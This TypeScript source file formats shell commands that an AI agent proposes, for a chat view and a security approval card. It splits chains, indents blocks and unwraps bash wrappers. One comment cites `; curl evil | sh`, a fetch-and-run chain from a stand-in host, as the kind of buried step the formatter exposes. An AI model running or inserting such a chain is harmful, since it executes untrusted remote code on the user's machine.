// Control-flow keywords the splitter understands. `do`/`then` close a block
// header and open its body, `done`/`fi`/`esac` close a block, and `else`/`elif`
// do both.
const BLOCK_OPEN = new Set(['do', 'then', 'else'])
const BLOCK_CLOSE = new Set(['done', 'fi', 'esac', 'else', 'elif'])
// Keywords that start a block header, and the keyword that closes that header.
// Everything up to the closer is one condition (or, for a case, one subject), so
// a `;`/`&&`/`||` inside it must NOT start a new line - `if a && b; then` is one
// step, not two.
const BLOCK_HEADER: Record<string, 'block' | 'case'> = {
  for: 'block',
  select: 'block',
  while: 'block',
  until: 'block',
  if: 'block',
  elif: 'block',
  case: 'case',
}

// Spaces a block body is indented by. The user can change it in the Settings
// Browser tab (0 leaves bodies flush left); see lib/chatPrefs.
export const DEFAULT_BASH_INDENT = 4
export const MAX_BASH_INDENT = 8

// bareWordAt returns the unquoted lowercase word starting at i, provided it is a
// whole token (the character after it delimits). The caller is responsible for
// only asking when i is in command position - in `echo done` the `done` is an
// argument, not a keyword.
function bareWordAt(cmd: string, i: number): string {
  const match = /^[a-z]+/.exec(cmd.slice(i))
  if (!match) return ''
  const after = cmd[i + match[0].length]
  return after === undefined || /[\s;&|()<>]/.test(after) ? match[0] : ''
}

// splitBashChains inserts a newline after each top-level `;`, `&&` and `||` so a
// chained one-liner reads as separate steps, and lays a `for`/`while`/`until`/
// `if`/`case` block out over its own indented lines. `indent` is the number of
// spaces per level (0 leaves bodies flush left). It is deliberately optimistic:
// it only tracks quotes, backslash escapes and command position, not the full
// shell grammar, and a command that already contains newlines is left exactly as
// written.
//
// It is DISPLAY-ONLY. The only edits it makes are inserting line breaks and
// leading indentation, and dropping the run of spaces that a break just turned
// into trailing whitespace - every other byte of the original command is still
// shown, in the same order. That property is what makes it safe to use on the
// security approval card: the text a user approves is the command that runs;
// splitting merely makes a buried `; curl evil | sh` easier to spot, never
// harder.
export function splitBashChains(cmd: string, indent: number = DEFAULT_BASH_INDENT): string {
  if (cmd.includes('\n')) return cmd
  const pad = ' '.repeat(Math.min(MAX_BASH_INDENT, Math.max(0, Math.trunc(indent) || 0)))
  let out = ''
  // The next break to emit, flushed lazily so the indent is computed at the
  // depth the line it starts actually sits at (a line opening with `done` has
  // already dropped a level by the time the break is written).
  let pending = ''
  // The open blocks, innermost last: a `do`/`then` body, a `case` whose patterns
  // are being listed, or one `pattern)` arm of a case. Every entry is exactly one
  // indent level, so the stack's depth IS the indent depth.
  const stack: ('block' | 'case' | 'branch')[] = []
  // Unclosed `(` outside quotes, so the `)` that ends a case pattern can be told
  // apart from one closing `$( )` / `( )` / `(( ))`.
  let parens = 0
  let inSingle = false
  let inDouble = false
  let escaped = false
  // Whether the next bare word starts a command - only there is `done` the
  // keyword rather than an argument.
  let commandStart = true
  // Which block header we are inside, if any: between `if`/`for`/... and its
  // `then`/`do`, or between `case` and its `in`. Chain operators there join one
  // condition instead of separating steps.
  let header: '' | 'block' | 'case' = ''

  const emit = (text: string) => {
    if (pending) {
      out += pending === '\n' ? '\n' + pad.repeat(stack.length) : pending
      pending = ''
    }
    out += text
  }
  // Start the body of a block that the keyword at i just opened, skipping the
  // spaces the break makes trailing.
  const openBody = (i: number, kind: 'block' | 'case') => {
    stack.push(kind)
    header = ''
    pending = '\n'
    let j = i
    while (cmd[j + 1] === ' ' || cmd[j + 1] === '\t') j++
    commandStart = true
    return j
  }

  for (let i = 0; i < cmd.length; i++) {
    const ch = cmd[i]
    if (escaped) {
      emit(ch)
      escaped = false
      continue
    }
    if (ch === '\\') {
      emit(ch)
      escaped = true
      commandStart = false
      continue
    }
    if (ch === "'" && !inDouble) {
      emit(ch)
      inSingle = !inSingle
      commandStart = false
      continue
    }
    if (ch === '"' && !inSingle) {
      emit(ch)
      inDouble = !inDouble
      commandStart = false
      continue
    }
    if (inSingle || inDouble) {
      emit(ch)
      continue
    }

    // `case <subject> in`: the `in` closes the header, and unlike `do`/`then` it
    // follows the subject rather than sitting in command position - so it is
    // matched on a plain word boundary. `for x in ...` is unaffected: its header
    // is a 'block' one, closed by `do`.
    if (header === 'case' && bareWordAt(cmd, i) === 'in' && (i === 0 || /[\s;&|()]/.test(cmd[i - 1]))) {
      emit('in')
      i = openBody(i + 1, 'case')
      continue
    }

    const keyword = commandStart ? bareWordAt(cmd, i) : ''
    if (keyword && (BLOCK_OPEN.has(keyword) || BLOCK_CLOSE.has(keyword) || keyword in BLOCK_HEADER)) {
      if (BLOCK_CLOSE.has(keyword)) {
        // The final `;;` of a case is optional, so `esac` may still be inside the
        // last arm - leave that arm before closing the case itself.
        if (keyword === 'esac' && stack[stack.length - 1] === 'branch') stack.pop()
        stack.pop()
        header = ''
        if (out && pending !== '\n') pending = '\n'
      }
      emit(keyword)
      i += keyword.length - 1
      commandStart = false
      if (keyword in BLOCK_HEADER) header = BLOCK_HEADER[keyword]
      if (BLOCK_OPEN.has(keyword)) i = openBody(i, 'block')
      continue
    }

    // The `)` that ends a case pattern opens that arm: its first command stays on
    // the pattern line (`a) echo a ;;` is the whole point of a one-line case) and
    // any further command in the arm indents under it. A `(a|b)` pattern works
    // because a `(` in pattern position is part of the pattern, not a subshell.
    const inPatterns = stack[stack.length - 1] === 'case'
    if (ch === '(' && !(inPatterns && commandStart)) {
      emit(ch)
      parens++
      commandStart = true
      continue
    }
    if (ch === ')') {
      emit(ch)
      commandStart = false
      if (parens > 0) parens--
      else if (inPatterns) {
        stack.push('branch')
        commandStart = true
      }
      continue
    }

    // `;;` - and the `;&` / `;;&` fall-through spellings - end a case arm.
    const terminator = /^(?:;;&|;;|;&)/.exec(cmd.slice(i, i + 3))?.[0]
    if (terminator) {
      emit(terminator)
      i += terminator.length - 1
      if (stack[stack.length - 1] === 'branch') stack.pop()
      while (cmd[i + 1] === ' ' || cmd[i + 1] === '\t') i++
      commandStart = true
      if (i + 1 < cmd.length) pending = '\n'
      continue
    }

    // `;` splits; `&&`/`||` split after the second character. A single `|` (pipe)
    // or `&` (background/redirect) does not, though both still put what follows
    // in command position.
    const isChain = ch === ';' || ((ch === '&' || ch === '|') && cmd[i + 1] === ch)
    if (!isChain) {
      emit(ch)
      if (/[&|{!]/.test(ch)) commandStart = true
      else if (!/\s/.test(ch)) commandStart = false
      continue
    }
    emit(ch)
    if (ch !== ';') emit(cmd[++i])
    while (cmd[i + 1] === ' ' || cmd[i + 1] === '\t') i++
    commandStart = true
    if (i + 1 >= cmd.length) continue
    // Keep the conventional error-suppression suffixes attached to the command
    // they qualify. Splitting `command -v bun || true` (or `... || :`) leaves a
    // visually orphaned no-op on its own line and makes the script harder, not
    // easier, to scan. Other control chains still split normally.
    const rest = cmd.slice(i + 1).trim()
    const trivialFallback = ch === '|' && /^(?:true|:)\s*$/.test(rest)
    pending = header || trivialFallback ? ' ' : '\n'
  }
  return out
}

// Codex reports shell commands as the argv-style launcher it executed, commonly
// `/usr/bin/bash -lc '<script>'`. The wrapper is implementation detail, so show
// the script itself while retaining the untouched item behind the tool card's
// Raw toggle. App-server also reports the equivalent `-c` form and, depending
// on platform/launch path, spells the executable as bash, /bin/bash, or
// /usr/bin/bash. Unquoted remainders are accepted because this is a display
// formatter for the provider's command string, not an argv parser.
function parseOneShellWord(source: string): string | null {
  let out = ''
  let quote: "'" | '"' | null = null
  let escaped = false
  let started = false
  for (let i = 0; i < source.length; i++) {
    const ch = source[i]
    if (escaped) {
      out += ch
      escaped = false
      started = true
      continue
    }
    if (quote === "'") {
      if (ch === "'") quote = null
      else out += ch
      started = true
      continue
    }
    if (quote === '"') {
      if (ch === '"') quote = null
      else if (ch === '\\' && /[\\"$`\n]/.test(source[i + 1] ?? '')) escaped = true
      else out += ch
      started = true
      continue
    }
    if (ch === "'" || ch === '"') {
      quote = ch
      started = true
    } else if (ch === '\\') {
      escaped = true
      started = true
    } else if (/\s/.test(ch)) {
      if (started && source.slice(i).trim()) return null
    } else {
      out += ch
      started = true
    }
  }
  return quote || escaped || !started ? null : out
}

function unwrapOneBashCommand(command: string): string {
  const match = command.match(/^(?:\/usr\/bin\/|\/bin\/)?bash\s+-(?:l)?c\s+([\s\S]+)$/)
  if (!match) return command
  const arg = match[1].trim()
  if (!arg) return command
  return parseOneShellWord(arg) ?? arg
}

export function unwrapBashLoginCommand(command: string): string {
  let current = command
  for (let depth = 0; depth < 3; depth++) {
    const next = unwrapOneBashCommand(current)
    if (next === current) break
    current = next
  }
  return current
}

// stripLineContinuations drops the trailing `\` from a `\`-newline pair so a
// multi-line script reads as plain lines instead of carrying the escape noise.
// The line break itself is kept (bash would join the lines, but the author wrote
// them apart deliberately), and leading/trailing blank lines - e.g. the lone `\`
// some agents emit before the first real line - are removed.
//
// Quote-aware: inside single quotes a backslash is literal, so `\`-newline there
// is left alone. Unlike splitBashChains this DOES remove characters, so it is for
// the chat transcript only, never the approval card.
export function stripLineContinuations(cmd: string): string {
  if (!cmd.includes('\n')) return cmd
  let out = ''
  let inSingle = false
  let inDouble = false
  let escaped = false
  for (let i = 0; i < cmd.length; i++) {
    const ch = cmd[i]
    if (escaped) {
      out += ch
      escaped = false
      continue
    }
    if (ch === '\\' && !inSingle) {
      if (cmd[i + 1] === '\n') {
        // Also drop the space that separated the backslash from the command, so
        // the line does not end in trailing whitespace.
        out = out.replace(/[ \t]+$/, '')
        continue
      }
      escaped = true
      out += ch
      continue
    }
    if (ch === "'" && !inDouble) inSingle = !inSingle
    else if (ch === '"' && !inSingle) inDouble = !inDouble
    out += ch
  }
  return out.replace(/^\s*\n/, '').trimEnd()
}

// dropRedundantSemicolons removes a `;` that sits immediately before a newline
// (allowing trailing spaces) or at the very end of the script - once a chain has
// been split onto separate lines, `cmd;` + newline is exactly `cmd` + newline in
// bash, so the `;` is pure noise. Quote-aware, and it never touches a `;;` case
// terminator. Display-only (chat, not the approval card) since it removes
// characters.
export function dropRedundantSemicolons(cmd: string): string {
  let out = ''
  let inSingle = false
  let inDouble = false
  let escaped = false
  for (let i = 0; i < cmd.length; i++) {
    const ch = cmd[i]
    if (escaped) {
      out += ch
      escaped = false
      continue
    }
    if (ch === '\\' && !inSingle) {
      escaped = true
      out += ch
      continue
    }
    if (ch === "'" && !inDouble) {
      inSingle = !inSingle
      out += ch
      continue
    }
    if (ch === '"' && !inSingle) {
      inDouble = !inDouble
      out += ch
      continue
    }
    // Skip a lone `;` (not part of `;;`) when only whitespace remains before the
    // next newline or the end of the script; drop that trailing whitespace too.
    if (ch === ';' && !inSingle && !inDouble && cmd[i - 1] !== ';' && cmd[i + 1] !== ';') {
      let j = i + 1
      while (cmd[j] === ' ' || cmd[j] === '\t') j++
      if (j >= cmd.length || cmd[j] === '\n') {
        i = j - 1
        continue
      }
    }
    out += ch
  }
  return out
}

// HOST_RUN matches the sandbox escape hatch an agent runs to ask for a command
// on the host - `hydra host-run -- <command>`, however the binary is spelled
// (`/tmp/hydra-internal`, a worktree-local `./hydra`, a bare `hydra`).
const HOST_RUN = /^\s*(?:[\w./-]*\/)?hydra(?:-internal)?\s+host-run\s+(?:--\s+)?([\s\S]+)$/

// parseHostRunScript returns the command a `hydra host-run` invocation is asking
// the user to run on the host, or null when the command isn't a host-run at all.
// The `bash -c '<script>'` wrapper agents habitually add is unwrapped, and a
// whole script passed as one quoted argument is unquoted - both mirror what the
// CLI itself does when it renders the request for the approval card, so the chat
// shows the same text the card asks about.
export function parseHostRunScript(command: string): string | null {
  const match = command.match(HOST_RUN)
  if (!match) return null
  const rest = match[1].trim()
  if (!rest) return null
  const unwrapped = unwrapBashLoginCommand(rest)
  if (unwrapped !== rest) return unwrapped
  return parseOneShellWord(rest) ?? rest
}

// dropNoopCd removes a leading `cd .` (or `cd ./`, quoted or not) together with
// the `&&` / `;` / newline that chains it to the real command. Changing to `.`
// is a no-op, so the prefix is pure noise - and worse, it makes the script look
// like it already has a `cd`, which suppresses the real working-directory
// preamble below. A command that is *only* `cd .` is left as written; there
// would be nothing left to show. Display-only (chat, not the approval card)
// since it removes characters.
export function dropNoopCd(cmd: string): string {
  let out = cmd
  for (;;) {
    const next = out.replace(/^[ \t]*cd[ \t]+(['"]?)\.\/?\1[ \t]*(?:&&|;|\n)[ \t\n]*/, '')
    if (next === out || !next.trim()) return out
    out = next
  }
}

function quoteShellPath(path: string): string {
  return /^[A-Za-z0-9_./-]+$/.test(path) ? path : `'${path.replace(/'/g, `'"'"'`)}'`
}

export function formatBashForDisplay(command: string, cwd?: string, indent: number = DEFAULT_BASH_INDENT): string {
  const script = dropRedundantSemicolons(splitBashChains(dropNoopCd(stripLineContinuations(unwrapBashLoginCommand(command))), indent))
  if (!cwd || cwd === '.' || /^\s*cd(?:\s|$)/.test(script)) return script
  return `cd ${quoteShellPath(cwd)}\n${script}`
}
